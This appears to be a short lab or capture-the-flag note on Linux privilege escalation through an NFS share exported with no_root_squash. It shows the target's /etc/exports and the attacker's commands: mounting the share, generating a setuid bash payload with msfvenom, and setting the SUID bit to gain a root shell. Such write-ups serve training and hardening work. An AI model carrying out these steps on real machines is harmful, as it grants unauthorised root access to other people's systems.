# NFS

- Files created via NFS inherit the remote User's ID.
- If the user is root, and root squashing is enabled, the ID will instead be set to the "no body" user.
```
user@debian:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```
- You may note that the tmp file system has root squashing disabled. And therefore we can exploit this.
- On your kali box
```
mkdir -p /tmp/nfs

mount -o version=2 10.10.90.210:/tmp /tmp/nfs

msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

chmod +xs /tmp/nfs/shell.elf


``` 
- back on the debian machine you can execute /tmp/shell.elf & it will run as the root user to give you the shell
